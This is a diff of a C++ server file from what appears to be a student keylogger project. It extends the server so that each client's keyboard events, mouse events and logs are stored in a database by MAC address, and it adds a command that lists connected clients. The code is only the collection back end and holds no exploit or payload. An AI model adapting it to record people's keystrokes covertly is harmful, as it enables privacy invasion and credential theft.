@@ -5,7 +5,7 @@
 // Login   <antoine.plaskowski@epitech.eu>
 // 
 // Started on  Sat Oct 24 17:20:22 2015 Antoine Plaskowski
-// Last update Fri Nov  6 17:57:22 2015 Antoine Plaskowski
+// Last update Fri Nov  6 18:52:18 2015 Antoine Plaskowski
 //
 
 #include	"Server.hpp"
@@ -45,7 +45,6 @@ Server::~Server(void)
 
 bool	Server::run(void)
 {
-  m_clients.remove(nullptr);
   select();
   if (m_server.can_read() == true)
     m_clients.push_back(&m_new_iprotocol(m_server.accept(), m_new_itime()));
@@ -59,12 +58,18 @@ bool	Server::run(void)
 	    throw std::exception();
 	  else
 	    {
-	      auto ret = (*it)->get_keyboard();
-
-	      std::cout << "je check" << std::endl;
-	      for (auto lol = ret.begin(); lol != ret.end(); lol++)
-		m_database.insert_keyboard((*it)->get_mac_address(), **lol);
-	      m_database.show((*it)->get_mac_address());
+	      auto keyboard = (*it)->get_keyboard();
+	      for (auto key = keyboard.begin(); key != keyboard.end(); key++)
+		m_database.insert_keyboard((*it)->get_mac_address(), **key);
+	      keyboard.clear();
+	      auto mouse = (*it)->get_mouse();
+	      for (auto key = mouse.begin(); key != mouse.end(); key++)
+		m_database.insert_mouse((*it)->get_mac_address(), **key);
+	      mouse.clear();
+	      auto log = (*it)->get_log();
+	      for (auto key = log.begin(); key != log.end(); key++)
+		m_database.insert_log((*it)->get_mac_address(), **key);
+	      log.clear();
 	    }
 	}
       catch (std::exception &e)
@@ -74,6 +79,7 @@ bool	Server::run(void)
 	  *it = nullptr;	      
 	}
     }
+  m_clients.remove(nullptr);
   return (false);
 }
 
@@ -86,7 +92,9 @@ bool	Server::command(void)
     return (true);
   std::string	input(reinterpret_cast<char *>(buf), ret);
 
-  std::cout << input << std::endl;
+  if (input == "show\n")
+    for (auto it = m_clients.begin(); it != m_clients.end(); it++)
+      std::cout << (*it)->get_mac_address() << std::endl;
   return (false);
 }
 
